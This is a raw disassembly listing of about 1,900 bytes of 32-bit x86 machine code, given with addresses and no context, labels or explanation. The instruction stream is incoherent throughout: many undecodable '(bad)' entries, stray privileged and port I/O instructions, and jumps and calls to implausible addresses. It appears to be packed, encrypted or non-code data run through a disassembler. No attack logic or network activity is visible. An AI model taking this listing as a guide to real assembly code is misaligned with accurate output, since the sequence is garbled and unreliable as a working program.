  408cbd:	test   DWORD PTR [edi+eiz*8],eax
  408cc0:	mov    ecx,0x2690171b
  408cc5:	cs (bad) 
  408cc7:	fisub  WORD PTR [ecx]
  408cc9:	gs jecxz 0x408d02
  408ccc:	std    
  408ccd:	lods   eax,DWORD PTR ds:[esi]
  408cce:	sbb    eax,0x1478705
  408cd3:	ret    
  408cd4:	aad    0x8b
  408cd6:	scas   eax,DWORD PTR es:[edi]
  408cd7:	xor    DWORD PTR [esi+0x4f6706fd],edi
  408cdd:	outs   dx,DWORD PTR ds:[esi]
  408cde:	push   esi
  408cdf:	cmp    eax,0x3be5007f
  408ce4:	sub    edx,edi
  408ce6:	stos   BYTE PTR es:[edi],al
  408ce7:	std    
  408ce8:	outs   dx,BYTE PTR ds:[esi]
  408ce9:	repnz iret 
  408ceb:	push   cs
  408cec:	repz jns 0x408cb5
  408cef:	xlat   BYTE PTR ds:[ebx]
  408cf0:	lahf   
  408cf1:	jge    0x408cf4
  408cf3:	stos   DWORD PTR es:[edi],eax
  408cf4:	cli    
  408cf5:	pushf  
  408cf6:	cmp    BYTE PTR [ecx-0x6a],bh
  408cf9:	(bad)  
  408cfa:	pusha  
  408cfb:	dec    eax
  408cfc:	(bad)  
  408cfe:	pusha  
  408cff:	lods   eax,DWORD PTR ds:[esi]
  408d00:	test   al,0xc8
  408d02:	rcr    BYTE PTR [ebp-0x569f49f4],cl
  408d08:	pop    ecx
  408d09:	jg     0x408cee
  408d0b:	ror    DWORD PTR [ecx+ecx*4-0x49a8017],0x17
  408d13:	into   
  408d14:	inc    edi
  408d15:	bound  esi,QWORD PTR [ebp-0x3a]
  408d18:	out    0xb0,al
  408d1a:	(bad)  
  408d1b:	hlt    
  408d1c:	or     ebp,DWORD PTR [esi+0x278efd06]
  408d22:	or     BYTE PTR [ebp+0x1335652],dl
  408d28:	xor    eax,0x16e0c000
  408d2d:	cmp    al,0xbd
  408d2f:	scas   eax,DWORD PTR es:[edi]
  408d30:	repnz out 0x1e,eax
  408d33:	add    BYTE PTR [edx-0x3f4c4d4],dh
  408d39:	cmp    al,0xf0
  408d3b:	repz (bad) 
  408d3d:	fidivr DWORD PTR [edi-0x2f86539f]
  408d43:	cli    
  408d44:	sahf   
  408d45:	int3   
  408d46:	cli    
  408d47:	scas   al,BYTE PTR es:[edi]
  408d48:	retf   0xfff8
  408d4b:	outs   dx,BYTE PTR ds:[esi]
  408d4c:	jnp    0x408cfe
  408d4e:	adc    eax,0x84c99305
  408d53:	jns    0x408ceb
  408d55:	das    
  408d56:	and    DWORD PTR [ecx+0x5c67278b],esi
  408d5c:	mov    ebp,0x16884536
  408d61:	dec    ecx
  408d62:	loop   0x408d7c
  408d64:	inc    eax
  408d65:	stos   DWORD PTR es:[edi],eax
  408d66:	lods   eax,DWORD PTR ds:[esi]
  408d67:	call   0x7986a163
  408d6c:	mov    edx,ecx
  408d6e:	inc    esi
  408d6f:	mov    ebx,DWORD PTR [ebx-0x13]
  408d72:	cmp    DWORD PTR [ecx-0x12],ebx
  408d75:	popf   
  408d76:	cmp    eax,0xd1b9152b
  408d7b:	pop    ebx
  408d7c:	das    
  408d7d:	sbb    esp,eax
  408d7f:	mov    dh,0x61
  408d81:	repz mov ebp,eax
  408d84:	ja     0x408dda
  408d86:	cs js  0x408d30
  408d89:	stos   BYTE PTR es:[edi],al
  408d8a:	loope  0x408d54
  408d8c:	fidiv  WORD PTR [eax+edx*1]
  408d8f:	int    0x6b
  408d91:	les    edi,FWORD PTR [esi-0x80]
  408d94:	push   ebp
  408d95:	sti    
  408d96:	mov    ds:0xab3e42e3,al
  408d9b:	xor    DWORD PTR [esi-0x63],edi
  408d9e:	inc    ecx
  408d9f:	mov    al,0x78
  408da1:	adc    eax,eax
  408da3:	sbb    BYTE PTR [edx+0x171ba42],cl
  408da9:	xor    ecx,ebx
  408dab:	ins    BYTE PTR es:[edi],dx
  408dac:	data16 fdivr QWORD PTR [eax-0x59ada380]
  408db3:	or     esi,DWORD PTR [ebx]
  408db5:	mov    al,ds:0xb005696
  408dba:	mov    ebx,0x8ba6857a
  408dbf:	dec    eax
  408dc0:	mov    DWORD PTR [edx-0x53],esp
  408dc3:	mov    ebx,0xbb12e375
  408dc8:	aaa    
  408dc9:	pop    esi
  408dca:	loope  0x408da0
  408dcc:	mov    DWORD PTR [ebp+0x6d8cb7aa],ecx
  408dd2:	cld    
  408dd3:	(bad)
  408dd6:	dec    ebp
  408dd7:	sbb    DWORD PTR [eax-0x6e],0xeddba124
  408dde:	xor    cl,bh
  408de0:	xor    bl,BYTE PTR [esi-0x1ba40987]
  408de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de7:	ret    
  408de8:	mov    ds:0xdb1f79ef,eax
  408ded:	cmp    esp,DWORD PTR [edi+0x48460fe9]
  408df3:	cdq    
  408df4:	aam    0x66
  408df6:	pop    ds
  408df7:	add    ch,BYTE PTR [edx+0x69]
  408dfa:	retf   
  408dfb:	icebp  
  408dfc:	jmp    0x2255ce9b
  408e01:	sbb    DWORD PTR [esi-0x61cffc7b],edx
  408e07:	or     ah,0xcd
  408e0a:	popf   
  408e0b:	push   eax
  408e0c:	mov    al,ds:0x5853be24
  408e11:	mov    ah,0xb5
  408e13:	out    0x54,al
  408e15:	jecxz  0x408e12
  408e17:	sti    
  408e18:	sti    
  408e19:	adc    al,0x45
  408e1b:	push   ecx
  408e1c:	pop    ds
  408e1d:	(bad)  
  408e1e:	in     al,0x9c
  408e20:	jg     0x408e19
  408e22:	xor    eax,0x9cfe100b
  408e27:	add    al,BYTE PTR [eax-0x6a]
  408e2a:	int    0x1f
  408e2c:	add    bh,BYTE PTR [esi]
  408e2e:	gs loope 0x408e60
  408e31:	pop    ebx
  408e32:	imul   edi,esi,0xffffff86
  408e35:	mov    ch,0x76
  408e37:	xor    ebp,DWORD PTR [eax]
  408e39:	jl     0x408e30
  408e3b:	xor    DWORD PTR [esi-0x6abffe86],esp
  408e41:	xchg   edi,eax
  408e42:	sbb    eax,0xae318018
  408e47:	aaa    
  408e48:	sub    ebx,esi
  408e4a:	and    BYTE PTR [ecx+ebp*4],0xdb
  408e4e:	ror    BYTE PTR [edx+0x29],1
  408e51:	div    dh
  408e53:	outs   dx,BYTE PTR ds:[esi]
  408e54:	jo     0x408e86
  408e56:	push   ss
  408e57:	pop    eax
  408e58:	fwait
  408e59:	cli    
  408e5a:	jl     0x408ecb
  408e5c:	dec    ecx
  408e5d:	xchg   edx,eax
  408e5e:	dec    eax
  408e5f:	fisubr DWORD PTR [ecx+0x61c30263]
  408e65:	dec    edx
  408e66:	stos   DWORD PTR es:[edi],eax
  408e67:	xchg   ebp,eax
  408e68:	and    BYTE PTR [ebp-0x610768ba],dl
  408e6e:	aas    
  408e6f:	push   0x97bb2c39
  408e74:	bound  ebp,QWORD PTR [edi]
  408e76:	ds aam 0xf3
  408e79:	icebp  
  408e7a:	test   eax,0x812ed2b
  408e7f:	fcom   DWORD PTR ds:0xbbee69e7
  408e85:	shl    DWORD PTR [ecx+0x4d],cl
  408e88:	mov    al,ds:0xcb51e709
  408e8d:	out    0xb4,eax
  408e8f:	push   es
  408e90:	arpl   WORD PTR [esi+eax*8],sp
  408e93:	mov    eax,0x672ca004
  408e98:	cmp    DWORD PTR ds:0xab019bd8,esp
  408e9e:	xchg   esi,eax
  408e9f:	dec    eax
  408ea0:	pop    esp
  408ea1:	xchg   ebp,eax
  408ea2:	cli    
  408ea3:	pop    ebx
  408ea4:	sti    
  408ea5:	sbb    ebp,ebp
  408ea7:	fistp  QWORD PTR [ebx-0x50747c83]
  408ead:	jg     0x408e3a
  408eaf:	xor    esp,DWORD PTR [edi]
  408eb1:	fimul  DWORD PTR [eax]
  408eb3:	inc    ecx
  408eb4:	adc    eax,0xe7bd8bee
  408eb9:	dec    ebp
  408eba:	addr16 pop edi
  408ebc:	cmp    al,0xb3
  408ebe:	dec    esi
  408ebf:	ins    BYTE PTR es:[edi],dx
  408ec0:	push   edi
  408ec1:	sub    esp,DWORD PTR [ebp-0x1b850a18]
  408ec7:	jns    0x408e8a
  408ec9:	xlat   BYTE PTR ds:[ebx]
  408eca:	push   esp
  408ecc:	jns    0x408f34
  408ece:	jns    0x408e9a
  408ed0:	mov    ds:0xcec93f8f,eax
  408ed5:	test   eax,0x3c9f6cb3
  408eda:	dec    ebp
  408edb:	mov    ebx,0x7336c3d3
  408ee0:	jle    0x408f39
  408ee2:	pop    ecx
  408ee3:	dec    ecx
  408ee4:	xor    al,0xb6
  408ee6:	mov    cl,0xa8
  408ee8:	ds ja  0x408e98
  408eeb:	add    eax,0xf5032fed
  408ef0:	xlat   BYTE PTR ds:[ebx]
  408ef1:	push   eax
  408ef2:	sbb    BYTE PTR [eax+0x3d54b4e4],dl
  408ef8:	retf   
  408ef9:	scas   eax,DWORD PTR es:[edi]
  408efa:	cmp    DWORD PTR [eax],ecx
  408efc:	dec    eax
  408efd:	or     BYTE PTR [ecx-0x3437efcc],dh
  408f03:	add    DWORD PTR [eax+0x7d],esi
  408f06:	mov    ecx,0xfc99df46
  408f0b:	fadd   DWORD PTR [ebx]
  408f0d:	shr    BYTE PTR [esi+esi*1-0x13],0x3
  408f12:	dec    edi
  408f13:	add    BYTE PTR [edi-0x3bf3827e],cl
  408f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1a:	(bad)  
  408f1b:	(bad)  
  408f1c:	jg     0x408eef
  408f1e:	bound  esi,QWORD PTR [edi]
  408f20:	mov    edi,?
  408f22:	(bad)  
  408f23:	sbb    BYTE PTR [edi],bh
  408f25:	push   0x35b7283b
  408f2a:	push   ecx
  408f2b:	iret   
  408f2c:	iret   
  408f2d:	add    dl,BYTE PTR [eax]
  408f2f:	add    BYTE PTR [eax],cl
  408f31:	(bad)  
  408f32:	enter  0x2184,0x99
  408f36:	push   es
  408f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f38:	mov    esp,0x892bd023
  408f3d:	push   edx
  408f3e:	mov    bl,ch
  408f40:	mov    ebp,0x400f763d
  408f45:	or     dl,BYTE PTR [ebp+0x31]
  408f48:	add    BYTE PTR [ecx+ecx*2-0x6e],0x44
  408f4d:	shr    bl,1
  408f4f:	mov    WORD PTR es:[esi+0x2906362d],es
  408f56:	jecxz  0x408f1b
  408f58:	cmp    BYTE PTR [ecx+0x725d836],0xdb
  408f5f:	push   ecx
  408f60:	leave  
  408f61:	add    cl,BYTE PTR ds:0xf6bcac05
  408f67:	inc    edi
  408f68:	adc    DWORD PTR [ebx+ecx*8-0x6f],esp
  408f6c:	lods   eax,DWORD PTR ds:[esi]
  408f6d:	mov    ch,0x3a
  408f6f:	ss push 0x74
  408f72:	hlt    
  408f73:	sub    eax,0x20000063
  408f78:	add    BYTE PTR [ecx+0x44],cl
  408f7b:	inc    ecx
  408f7c:	push   esp
  408f7d:	popf   
  408f7e:	dec    ebx
  408f7f:	add    BYTE PTR [eax-0x3c3ba676],dh
  408f85:	xchg   esp,eax
  408f86:	sub    eax,0xeb976f75
  408f8b:	mov    ecx,0x72c86d4a
  408f90:	shr    DWORD PTR [esi+ebp*1-0x68],0xcd
  408f95:	sub    eax,0x9592ccb3
  408f9a:	xchg   esi,eax
  408f9b:	scas   al,BYTE PTR es:[edi]
  408f9c:	jbe    0x408f2f
  408f9e:	add    dl,BYTE PTR [ebx]
  408fa0:	mov    bl,0x80
  408fa2:	clc    
  408fa3:	xchg   esi,eax
  408fa4:	bound  ebp,QWORD PTR [edx+eax*8+0x5d]
  408fa8:	pop    edx
  408fa9:	mov    BYTE PTR [ebp-0x66247afe],al
  408faf:	iret   
  408fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb1:	mov    esp,0x3837caf1
  408fb6:	mov    ebp,0xa8a5209d
  408fbb:	sub    BYTE PTR [ecx-0x18],dh
  408fbe:	std    
  408fbf:	out    dx,eax
  408fc0:	lds    eax,FWORD PTR [edi]
  408fc2:	adc    al,al
  408fc4:	and    BYTE PTR [eax],ch
  408fc6:	mov    edi,0xbf678631
  408fcb:	stc    
  408fcc:	add    bh,BYTE PTR [ebx-0x101c329d]
  408fd2:	sti    
  408fd3:	add    bl,bl
  408fd5:	cmp    esp,DWORD PTR [edi+0x38]
  408fd8:	jno    0x408fcc
  408fda:	sub    al,0xbd
  408fdc:	(bad)  
  408fdd:	rcl    BYTE PTR [edi+0x1625106d],1
  408fe3:	neg    DWORD PTR [edi-0xd]
  408fe6:	or     eax,esi
  408fe8:	neg    DWORD PTR [esi]
  408fea:	aas    
  408feb:	sbb    edx,DWORD PTR [ecx+0x12]
  408fee:	push   esp
  408fef:	xchg   esp,eax
  408ff0:	sbb    BYTE PTR ds:0x28a90122,dl
  408ff6:	jmp    0x10e6626f
  408ffb:	pusha  
  408ffc:	push   ebx
  408ffd:	(bad)  [ebx+0x2f6258a2]
  409003:	inc    edx
  409004:	mov    BYTE PTR [edi+0x44befb80],dh
  40900a:	fmul   DWORD PTR [edi+0x66cc0025]
  409010:	rcl    DWORD PTR [ebx-0x40],cl
  409013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409014:	sar    dh,0x9c
  409017:	mov    ch,0xf6
  409019:	pop    ss
  40901a:	mov    al,0xe6
  40901c:	xor    DWORD PTR [ebx+0x6d],ebp
  40901f:	retf   
  409020:	jp     0x408fc7
  409022:	mov    dh,0xa6
  409024:	dec    esi
  409025:	mov    cl,0x82
  409027:	jb     0x409084
  409029:	ins    BYTE PTR es:[edi],dx
  40902a:	aam    0xd3
  40902c:	mov    ebx,0xed0c3f5e
  409031:	jb     0x409006
  409033:	cmp    BYTE PTR [ebx-0x2e524adb],bh
  409039:	fs stc 
  40903b:	pushf  
  40903c:	fldcw  WORD PTR [esi+edi*4-0x18]
  409040:	jne    0x409032
  409042:	int3   
  409043:	pop    eax
  409044:	or     dl,dl
  409046:	and    al,0xe1
  409048:	jmp    0x90ad:0xbadc9bd5
  40904f:	dec    edx
  409050:	nop
  409051:	and    al,0x4e
  409053:	icebp  
  409054:	xchg   ebp,eax
  409055:	(bad)  
  409056:	ficom  WORD PTR [esi]
  409058:	adc    cl,0xa8
  40905b:	(bad)
  40905e:	mov    ebx,ebp
  409060:	mov    ebp,0x94b4a28c
  409065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409066:	mov    ebx,0xc7228583
  40906b:	fisttp WORD PTR [edi-0x15e6258e]
  409071:	retf   0x1419
  409074:	repnz or BYTE PTR [ebx],dh
  409077:	inc    eax
  409078:	mov    al,0x38
  40907a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40907b:	jbe    0x40904b
  40907d:	adc    eax,0x7dd77e8a
  409082:	(bad)  
  409083:	cdq    
  409084:	adc    al,0x95
  409086:	repnz mov ebx,0xd4eae32
  40908c:	pop    edx
  40908d:	inc    ebx
  40908e:	xchg   esi,eax
  40908f:	dec    ebx
  409090:	es xor eax,ebx
  409093:	loope  0x4090e9
  409095:	xor    BYTE PTR [ebp+0xb8319fb],bl
  40909b:	dec    ebx
  40909c:	xchg   ecx,eax
  40909d:	or     BYTE PTR [edi],dh
  40909f:	add    ch,BYTE PTR [esi+0x16024981]
  4090a5:	sub    esp,DWORD PTR [edi+0x45635845]
  4090ab:	mov    ebp,0xbce4595c
  4090b0:	cmc    
  4090b1:	cli    
  4090b2:	or     ebp,esp
  4090b4:	mov    WORD PTR [edi*4+0x28a2975e],gs
  4090bb:	push   esi
  4090bc:	xchg   ch,dh
  4090be:	push   esi
  4090bf:	sub    BYTE PTR [ecx-0x33],cl
  4090c2:	xchg   esi,eax
  4090c3:	push   es
  4090c4:	addr16 pop edi
  4090c6:	idiv   ebx
  4090c8:	jge    0x40905e
  4090ca:	push   edx
  4090cb:	cmp    al,0xfb
  4090cd:	(bad)  
  4090ce:	out    0xb9,eax
  4090d0:	jb     0x409135
  4090d2:	retf   0x8f63
  4090d5:	inc    DWORD PTR [ebx+ebx*8]
  4090d8:	cmp    esp,DWORD PTR [edi-0x718ac627]
  4090de:	outs   dx,BYTE PTR ds:[esi]
  4090df:	outs   dx,DWORD PTR ds:[esi]
  4090e0:	mov    BYTE PTR [ebp-0x42e012fe],dh
  4090e6:	jb     0x409142
  4090e8:	push   edx
  4090e9:	test   DWORD PTR [ebx],0x78de82ac
  4090ef:	jnp    0x4090bd
  4090f1:	add    dl,al
  4090f3:	int3   
  4090f4:	inc    eax
  4090f5:	inc    esi
  4090f6:	das    
  4090f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f8:	das    
  4090f9:	das    
  4090fa:	dec    ebx
  4090fb:	call   0x88acac9
  409100:	mov    ah,0xa9
  409102:	daa    
  409103:	std    
  409104:	les    ebp,FWORD PTR [esi+eiz*4+0x22acb2c]
  40910b:	adc    BYTE PTR [edi],bh
  40910d:	pop    ss
  40910e:	lock fisubr DWORD PTR [edi-0x4]
  409112:	(bad)  
  409113:	outs   dx,DWORD PTR ds:[esi]
  409114:	fdiv   QWORD PTR [edi+0x7e41c061]
  40911a:	ins    BYTE PTR es:[edi],dx
  40911b:	add    BYTE PTR [eax+0x3a],ah
  40911e:	cmp    eax,0x34f8107c
  409123:	mov    BYTE PTR [edi+0x75fcc6b1],bl
  409129:	imul   ecx,ebp,0xffffffd9
  40912c:	mov    al,ds:0xf74504f0
  409131:	mov    dh,0x3d
  409133:	xor    BYTE PTR ds:0x59bce9e,0xad
  40913a:	(bad)  
  40913b:	pop    eax
  40913c:	mov    edi,fs
  40913e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913f:	push   edx
  409140:	dec    edx
  409141:	push   esp
  409142:	xchg   edx,eax
  409143:	and    bh,BYTE PTR [edi+ebp*2-0x5e]
  409147:	retf   
  409148:	xchg   edx,eax
  409149:	cmp    al,0x9b
  40914b:	mov    ds:0x2c6302cb,eax
  409150:	pop    edx
  409151:	xchg   edi,eax
  409152:	cwde   
  409153:	loopne 0x4090e2
  409155:	or     eax,0xa7e0b82b
  40915a:	loopne 0x40918c
  40915c:	xchg   BYTE PTR [ebx],bl
  40915e:	aaa    
  40915f:	outs   dx,BYTE PTR ds:[esi]
  409160:	xchg   ebx,eax
  409161:	xchg   edi,eax
  409162:	cmp    eax,0xa516a54
  409167:	lahf   
  409168:	push   es
  409169:	in     al,dx
  40916a:	pop    edx
  40916b:	nop
  40916c:	xchg   edx,eax
  40916d:	shr    BYTE PTR [ebp+0x2b],1
  409170:	ss push es
  409172:	sub    DWORD PTR [ebp-0x598b3db2],ebx
  409178:	sub    DWORD PTR [edi-0x59497e64],edx
  40917e:	pop    eax
  40917f:	dec    esi
  409180:	add    BYTE PTR [edi],0xde
  409183:	(bad)  
  409184:	adc    al,0xa2
  409186:	cmp    ch,BYTE PTR [esi]
  409188:	out    dx,al
  409189:	xchg   edx,eax
  40918a:	push   esi
  40918b:	cmc    
  40918c:	fcom   st(5)
  40918e:	ss mov edi,0x8abafda
  409194:	mov    ds,WORD PTR [esi+0x32]
  409197:	lods   al,BYTE PTR ds:[esi]
  409198:	loope  0x4091b6
  40919a:	pop    esp
  40919b:	bound  ebx,QWORD PTR [ebx]
  40919d:	xchg   ecx,eax
  40919e:	jns    0x4091a0
  4091a0:	aad    0x71
  4091a2:	(bad)  
  4091a3:	fsubr  DWORD PTR [edx-0x3]
  4091a6:	mov    edi,0x80d9773c
  4091ab:	pop    ecx
  4091ac:	push   es
  4091ad:	jns    0x40921d
  4091af:	sub    DWORD PTR [ebx+0x51],ecx
  4091b2:	dec    ebp
  4091b3:	ret    
  4091b4:	lea    ebx,[eax+0x26]
  4091b7:	cmp    dh,BYTE PTR [ebp+0xd69b45e]
  4091bd:	add    DWORD PTR [esi+0x6b],eax
  4091c0:	cs pop ebp
  4091c2:	js     0x4091dd
  4091c4:	cmp    eax,0x43cec2bf
  4091c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ca:	cdq    
  4091cb:	iret   
  4091cc:	out    0x95,eax
  4091ce:	add    BYTE PTR [eiz*4-0x66436a78],0xf0
  4091d6:	ror    DWORD PTR [ebx+esi*4-0x13],cl
  4091da:	cmc    
  4091db:	jp     0x409251
  4091dd:	cmp    bl,BYTE PTR ds:0x979dfdbe
  4091e3:	js     0x4091da
  4091e5:	int    0x1b
  4091e7:	cmp    al,0xf8
  4091e9:	call   0x402dcdf5
  4091ee:	inc    ebx
  4091ef:	scas   eax,DWORD PTR es:[edi]
  4091f0:	aas    
  4091f1:	add    al,0x21
  4091f3:	imul   esp,DWORD PTR [ecx+0x552f88c8],0x55
  4091fa:	sbb    eax,0xecb20e4f
  4091ff:	cwde   
  409200:	pop    edi
  409201:	push   esp
  409202:	sbb    eax,0x9868d5d6
  409207:	cmp    edx,DWORD PTR [eax-0x25]
  40920a:	js     0x40926e
  40920c:	push   ecx
  40920d:	mov    edx,DWORD PTR [edx]
  40920f:	cmp    DWORD PTR [edx+0x2b],ebx
  409212:	lods   al,BYTE PTR ds:[esi]
  409213:	pop    ecx
  409214:	int    0x0
  409216:	inc    edx
  409217:	add    al,0x20
  409219:	sahf   
  40921a:	or     ch,BYTE PTR [edx+edi*2]
  40921d:	sahf   
  40921e:	sti    
  40921f:	push   ds
  409220:	add    DWORD PTR [eax-0x67ff9ee1],eax
  409226:	dec    esp
  409227:	(bad)  
  409228:	ins    DWORD PTR es:[edi],dx
  409229:	loopne 0x409257
  40922b:	lock imul esp,eax,0x7f31ac17
  409232:	int    0xc2
  409234:	mov    al,0x8a
  409236:	mov    eax,ds:0xcabb0e46
  40923b:	add    edi,0x5457da82
  409241:	aas    
  409242:	push   0x5d
  409244:	push   edx
  409245:	dec    ecx
  409246:	xchg   esp,eax
  409247:	push   0x84e135b9
  40924c:	inc    eax
  40924d:	jmp    0x4091e1
  40924f:	xor    cl,bl
  409251:	sar    BYTE PTR [edx+0x5ee31b40],1
  409257:	or     al,0x6e
  409259:	pusha  
  40925a:	dec    ecx
  40925b:	xchg   esi,eax
  40925c:	xchg   edi,eax
  40925d:	pop    eax
  40925e:	xchg   esi,eax
  40925f:	out    0x1,eax
  409261:	inc    esp
  409262:	or     BYTE PTR [ecx+edx*8-0x748d41a4],cl
  409269:	shl    dh,cl
  40926b:	dec    ecx
  40926c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40926d:	dec    ebx
  40926e:	add    ecx,DWORD PTR [esi-0x6c]
  409271:	inc    esp
  409272:	jns    0x4092b1
  409274:	xchg   ebx,eax
  409275:	inc    edx
  409276:	nop
  409277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409278:	xchg   edx,eax
  409279:	shl    DWORD PTR [eax],0x65
  40927c:	arpl   WORD PTR [ebx],sp
  40927e:	loope  0x4092f0
  409280:	push   edx
  409281:	nop
  409282:	pop    ss
  409283:	sbb    dh,BYTE PTR [ebx-0x2fa8152c]
  409289:	imul   dl
  40928b:	imul   eax,DWORD PTR [ebx+0x71],0xffffff9b
  40928f:	(bad)  
  409290:	pop    edx
  409291:	xchg   esi,eax
  409292:	pop    ecx
  409293:	inc    eax
  409294:	dec    ebp
  409295:	add    dl,al
  409297:	rcl    BYTE PTR [edx+0x4f],0x5f
  40929b:	adc    eax,0xe1a84189
  4092a0:	cmp    ecx,DWORD PTR [eax]
  4092a2:	pusha  
  4092a3:	and    eax,edx
  4092a5:	mov    ebp,0x6b009cb8
  4092aa:	add    eax,0xb59eb842
  4092af:	sub    al,0xd
  4092b1:	jns    0x4092d4
  4092b3:	push   0x29
  4092b5:	shl    DWORD PTR [ecx+0x45],0x9e
  4092b9:	xor    BYTE PTR [ecx],ch
  4092bb:	inc    esi
  4092bc:	inc    ebp
  4092bd:	dec    eax
  4092be:	jmp    0x9c2a:0x2db76b5f
  4092c5:	mov    cl,0xdc
  4092c7:	mov    eax,0xbf331e76
  4092cc:	int3   
  4092cd:	cdq    
  4092ce:	push   ebx
  4092cf:	fwait
  4092d0:	mov    ch,0x85
  4092d2:	xor    DWORD PTR [edx-0x1b],esp
  4092d5:	mov    cs,WORD PTR [ebp-0x80]
  4092d8:	push   ebp
  4092d9:	and    al,ah
  4092db:	push   ds
  4092dc:	int    0xba
  4092de:	aad    0x7c
  4092e0:	cli    
  4092e1:	jge    0x409341
  4092e3:	jge    0x4092d2
  4092e5:	or     eax,0xafdbecfe
  4092ea:	jo     0x4092ce
  4092ec:	int3   
  4092ed:	jnp    0x409328
  4092ef:	jno    0x4092db
  4092f1:	sbb    al,0x5b
  4092f3:	(bad)  [edi+0x11360c18]
  4092f9:	pop    esi
  4092fa:	stc    
  4092fb:	sub    eax,0xba2ac6ee
  409300:	fild   QWORD PTR [eax+0x68fd1355]
  409306:	mov    esi,0xab2ab8b1
  40930b:	or     BYTE PTR [eax],al
  40930d:	adc    DWORD PTR [eax],ecx
  40930f:	push   esp
  409310:	retf   
  409311:	mov    al,ds:0xa0b4d219
  409316:	aad    0x6a
  409318:	cmp    edx,DWORD PTR [ebx+0x17f53a94]
  40931e:	adc    eax,0x4ca9ab8
  409323:	push   0x6efb9c30
  409328:	inc    ebx
  40932a:	(bad)  
  40932b:	adc    BYTE PTR [eax],al
  40932d:	sbb    al,0x4e
  40932f:	(bad)  
  409330:	and    eax,DWORD PTR [ecx]
  409332:	lahf   
  409333:	(bad)
  409336:	mov    dh,0xf0
  409338:	test   al,0xb5
  40933a:	test   BYTE PTR [ebx],0xd6
  40933d:	fadd   st,st(7)
  40933f:	lods   al,BYTE PTR ds:[esi]
  409340:	mov    ch,0xbd
  409342:	rcl    BYTE PTR [ebx-0x564297d1],1
  409348:	sub    DWORD PTR [esi-0x1b],edi
  40934b:	lds    ebp,FWORD PTR [edi-0xa931e36]
  409351:	and    al,0x41
  409353:	or     BYTE PTR ds:0xf1ac60d6,al
  409359:	icebp  
  40935a:	aad    0x12
  40935c:	imul   esi,DWORD PTR [edx+ebx*8],0x18
  409360:	out    0x8c,eax
  409362:	xor    DWORD PTR [esi],eax
  409364:	ins    DWORD PTR es:[edi],dx
  409365:	sub    al,0x79
  409367:	push   ecx
  409368:	inc    esi
  409369:	mov    ds:0x789e5cb3,eax
  40936e:	ss fwait
  409370:	xlat   BYTE PTR ds:[ebx]
  409371:	xlat   BYTE PTR ds:[ebx]
  409372:	outs   dx,DWORD PTR ds:[esi]
  409373:	ret    
  409374:	xor    eax,0xce4bad38
  409379:	mov    edi,0xfd68bb5
  40937e:	mov    ds:0x20a92414,al
  409383:	dec    ebp
  409384:	add    al,0x52
  409386:	push   es
  409387:	push   0xa
  409389:	imul   ebp,DWORD PTR [edx],0x6c5b0e19
  40938f:	(bad)  
  409390:	ficomp DWORD PTR [esp+ecx*4]
  409393:	or     esp,esi
  409395:	jae    0x4093da
  409397:	pop    esi
  409398:	fadd   DWORD PTR [esi]
  40939a:	das    
  40939b:	outs   dx,BYTE PTR ds:[esi]
  40939c:	call   0xd141:0x5ba57801
  4093a3:	imul   edx,DWORD PTR [esp+edi*2+0x55],0x33
  4093a8:	ins    BYTE PTR es:[edi],dx
  4093a9:	outs   dx,BYTE PTR ds:[esi]
  4093aa:	(bad)  
  4093ab:	aad    0x2d
  4093ad:	outs   dx,BYTE PTR ds:[esi]
  4093ae:	retf   0x92ab
  4093b1:	and    BYTE PTR [edx+0x6ebaae3],0xed
  4093b8:	or     eax,0xf27ac98e
  4093bd:	xchg   edx,eax
  4093be:	cmc    
  4093bf:	add    eax,DWORD PTR [ebx+0x366599e6]
  4093c5:	jae    0x409398
  4093c7:	cmp    BYTE PTR [ecx+0x16],0xcc
  4093cb:	add    BYTE PTR [eax-0x5b],ch
  4093ce:	pop    esi
  4093cf:	inc    ecx
  4093d0:	arpl   WORD PTR [esi-0x6e2d1b24],bx
  4093d6:	lods   eax,DWORD PTR ds:[esi]
  4093d7:	lea    esi,[ebp-0x3d412114]
  4093dd:	in     eax,dx
  4093de:	imul   ebx,edi,0xffffffe5
  4093e1:	icebp  
  4093e2:	inc    edi
  4093e3:	mov    dh,0xfd
  4093e5:	xchg   esp,eax
  4093e6:	pop    esi
  4093e7:	retf   
  4093e8:	imul   edi,DWORD PTR [esi-0x653985d5],0xd478205f
  4093f2:	shl    DWORD PTR [eiz*2-0x1e8de3c8],cl
  4093f9:	ret    0x9e45
  4093fc:	jns    0x4093f4
  4093fe:	inc    ebp
  4093ff:	xchg   BYTE PTR [ebx],bh
  409401:	(bad)  
  409403:	out    0x81,al
  409405:	(bad)  
  409406:	fcomp  st(4)
  409408:	cmp    cl,cl
  40940a:	jo     0x4093c0
  40940c:	add    eax,DWORD PTR [edx+0x55]
  40940f:	sub    al,0x25
  409411:	fadd   QWORD PTR [eax+esi*1+0x1]
  409415:	loop   0x4093f2
  409417:	jne    0x409479
  409419:	push   edi
  40941a:	scas   eax,DWORD PTR es:[edi]
  40941b:	scas   al,BYTE PTR es:[edi]
  40941c:	nop
  40941d:	adc    al,0x14
  40941f:	sti    
  409420:	aaa    
  409421:	add    cl,BYTE PTR [eax+0x4]
  409424:	jmp    0x3f17:0xe85fad5f
  40942b:	xor    eax,0xa6a3a0a6
  409430:	mov    ah,0x5a
  409432:	cmp    edi,DWORD PTR [esi+0x3d]
  409435:	test   ebp,esp
  409437:	test   DWORD PTR [eax-0x7b],ecx
  40943a:	adc    BYTE PTR [ecx+ebx*2+0x56],ah
  40943e:	lea    ecx,[eax]
  409440:	ins    BYTE PTR es:[edi],dx
  409441:	enter  0xaade,0x8d
  409445:	out    dx,eax
  409446:	push   esp
  409447:	jle    0x4093f1
  409449:	add    BYTE PTR [eax+0x38],dh
  40944c:	fidivr WORD PTR [edi]
  40944e:	pop    es
  40944f:	cld    
